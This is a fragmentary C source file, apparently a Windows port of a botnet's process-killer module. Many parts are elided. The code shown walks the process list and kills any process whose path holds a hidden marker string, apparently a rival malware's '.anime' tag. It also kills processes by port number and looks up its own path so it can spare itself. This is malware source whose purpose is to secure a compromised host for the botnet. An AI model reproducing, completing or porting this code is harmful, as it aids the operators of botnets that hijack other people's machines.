...
// Windows doesn't have PATH_MAX, define it
#ifndef PATH_MAX
...
// Process scanning state variables
...
void killer_init(void)
{
    ...
    {
#ifdef _WIN32
        // Windows implementation using process enumeration
        DWORD pid;
        char exe_path[PATH_MAX];
        
        if (!win_enum_processes_init())
        {
#ifdef DEBUG
            printf("[killer] Failed to initialize process enumeration!\n");
#endif
            break;
        }
        
        while (win_get_next_process(&pid, exe_path, sizeof(exe_path)))
        {
            scan_counter++;
            
            // Skip system processes and ourselves
            if (pid <= KILLER_MIN_PID || pid == GetCurrentProcessId())
                continue;
            ...
            // Check for .anime extension
            table_unlock_val(TABLE_KILLER_ANIME);
            if (util_stristr(exe_path, util_strlen(exe_path), table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
            {
                win_kill_process(pid);
            }
            table_lock_val(TABLE_KILLER_ANIME);
            
            // Skip if it's our own process
            if (util_strcmp(exe_path, killer_realpath))
                continue;
...
{
#ifdef _WIN32
    win_kill_process(GetCurrentProcessId());
#else
    kill(killer_pid, 9);
#endif
}
...
{
#ifdef _WIN32
    // Windows implementation using our Windows process helper
    return win_kill_process_by_port(ntohs(port));
#else
    DIR *dir, *fd_dir;
...
{
#ifdef _WIN32
    // Windows implementation - get current executable path
    return win_get_current_exe_path(killer_realpath, PATH_MAX);
#else
